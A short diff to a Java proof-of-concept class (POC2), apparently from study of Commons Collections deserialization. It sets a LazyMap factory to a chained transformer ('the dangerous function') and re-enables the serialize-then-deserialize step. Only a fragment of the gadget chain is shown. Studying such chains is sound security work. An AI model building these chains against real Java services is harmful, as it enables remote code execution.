@@ -84,7 +84,7 @@ public class POC2 {
         factoryField.setAccessible(true);//私有属性
         factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数
 
-//        Serliazation(map2);
+        Serliazation(map2);
         Unserlization();
     }
 }
